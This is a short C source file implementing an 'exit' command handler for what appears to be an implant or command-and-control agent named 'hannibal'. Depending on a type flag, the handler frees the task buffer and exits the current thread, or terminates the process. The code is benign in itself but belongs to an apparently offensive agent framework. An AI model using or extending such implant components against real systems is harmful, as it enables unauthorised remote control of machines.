#include "config.h"


#ifdef INCLUDE_CMD_EXIT

#include "hannibal_tasking.h"


SECTION_CODE void cmd_exit(TASK t)
{
    HANNIBAL_INSTANCE_PTR

    CMD_EXIT *exit_cmd = (CMD_EXIT *)t.cmd;

    if(exit_cmd->type == 1){
        hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
        hannibal_instance_ptr->Win32.RtlExitUserThread(0);
    } else {
        hannibal_instance_ptr->Win32.ExitProcess(0);
    }
}

#endif